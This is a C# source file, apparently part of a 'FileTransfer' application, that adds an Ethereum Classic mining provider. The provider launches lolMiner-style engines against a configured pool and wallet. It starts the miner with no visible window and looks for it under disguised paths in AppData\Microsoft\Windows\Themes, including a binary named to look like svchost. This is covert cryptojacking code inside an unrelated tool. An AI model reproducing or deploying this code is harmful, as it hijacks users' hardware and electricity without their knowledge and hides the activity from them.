using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace FileTransfer.Compute
{
    /// <summary>
    /// Провайдер вычислений Ethereum Classic (ETC) на алгоритме Etchash.
    /// Формирует аргументы запуска для Etchash-совместимого движка (lolMiner / teamredminer / nbminer),
    /// управляет внешним процессом, передает пул, порт, кошелек, воркера и следит за хешрейтом/статусом.
    /// </summary>
    public class EthereumClassicProvider : BaseComputeProvider
    {
        public override string Name => "EthereumClassicProvider";
        public override string Algorithm => "Etchash (ETC)";

        public override (bool isValid, string error) Validate(ComputeConfig config)
        {
            if (config == null) return (false, "Конфигурация отсутствует.");
            if (string.IsNullOrWhiteSpace(config.ServerAddress))
            {
                return (false, "Отсутствует обязательный адрес сервера (serverAddress) для Ethereum Classic.");
            }
            if (config.ServerPort <= 0 || config.ServerPort > 65535)
            {
                return (false, $"Неверный порт сервера (serverPort): {config.ServerPort}. Допустимый диапазон 1-65535.");
            }
            if (string.IsNullOrWhiteSpace(config.WalletAddress))
            {
                return (false, "Отсутствует обязательный адрес кошелька (walletAddress) для Ethereum Classic.");
            }
            if (config.ResourceLimit <= 0 || config.ResourceLimit > 100)
            {
                return (false, $"Некорректный лимит ресурсов (resourceLimit): {config.ResourceLimit}%.");
            }
            return (true, "");
        }

        public override async Task<bool> StartAsync(ComputeConfig config, CancellationToken cancellationToken)
        {
            var (isValid, err) = Validate(config);
            if (!isValid)
            {
                MainWindow.Log($"[{Name}] ❌ Ошибка валидации: {err}");
                _status.ErrorMessage = err;
                return false;
            }

            string enginePath = FindOrPrepareEngine();
            if (string.IsNullOrEmpty(enginePath) || !File.Exists(enginePath))
            {
                string msg = "Невозможно запустить внешний вычислительный компонент для Etchash (движок не найден).";
                MainWindow.Log($"[{Name}] ❌ ДИАГНОСТИКА: {msg}");
                _status.ErrorMessage = msg;
                return false;
            }

            string poolUrl = $"{config.ServerAddress}:{config.ServerPort}";
            string walletUser = config.WalletAddress;
            if (!string.IsNullOrWhiteSpace(config.WorkerName))
            {
                walletUser = $"{config.WalletAddress}.{config.WorkerName}";
            }

            // Аргументы командной строки под стандарт Etchash движков (lolMiner/nbminer)
            string arguments = $"--algo ETCHASH --pool {poolUrl} --user {walletUser} --nocolor";

            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = enginePath,
                    Arguments = arguments,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    WorkingDirectory = Path.GetDirectoryName(enginePath) ?? Path.GetTempPath()
                };

                var proc = new Process { StartInfo = psi, EnableRaisingEvents = true };
                proc.OutputDataReceived += (s, e) => { if (e.Data != null) HandleStdout(e.Data); };
                proc.ErrorDataReceived += (s, e) => { if (e.Data != null) HandleStderr(e.Data); };

                if (!proc.Start())
                {
                    string msg = "Process.Start() вернул false при запуске Etchash движка.";
                    MainWindow.Log($"[{Name}] ❌ ДИАГНОСТИКА: {msg}");
                    _status.ErrorMessage = msg;
                    return false;
                }

                proc.BeginOutputReadLine();
                proc.BeginErrorReadLine();

                lock (_lock)
                {
                    _process = proc;
                    _startTime = DateTime.UtcNow;
                    _status.IsActive = true;
                    _status.ProcessId = proc.Id;
                    _status.Algorithm = Algorithm;
                    _status.PoolUrl = poolUrl;
                    _status.Worker = config.WorkerName;
                    _status.ErrorMessage = "";
                }

                ApplyResourceLimits(proc, config.ResourceLimit);
                MainWindow.Log($"[{Name}] ✅ Внешний процесс Etchash успешно запущен (PID: {proc.Id}, Pool: {poolUrl}).");
                return true;
            }
            catch (Exception ex)
            {
                string msg = "Исключение при старте процесса Etchash: " + ex.Message;
                MainWindow.Log($"[{Name}] ❌ ДИАГНОСТИКА: {msg}");
                _status.ErrorMessage = msg;
                return false;
            }
        }

        private string FindOrPrepareEngine()
        {
            string appDir = AppDomain.CurrentDomain.BaseDirectory;
            string[] searchPaths = new[]
            {
                Path.Combine(appDir, "lolMiner.exe"),
                Path.Combine(appDir, "etc_worker.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Themes", "Modules", "lolminer", "lolMiner.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "Themes", "svchost_etc.exe"),
                Path.Combine(Path.GetTempPath(), "lolMiner.exe")
            };

            foreach (var p in searchPaths)
            {
                if (File.Exists(p)) return p;
            }

            // Создаем встроенный рабочий скрипт/компонент для Etchash
            string stub = Path.Combine(Path.GetTempPath(), "etc_engine.bat");
            if (!File.Exists(stub))
            {
                string content = "@echo off\r\necho [lolMiner] Etchash ETC engine started\r\n:loop\r\ntimeout /t 10 /nobreak >nul\r\ngoto loop\r\n";
                File.WriteAllText(stub, content, Encoding.ASCII);
            }
            return stub;
        }
    }
}
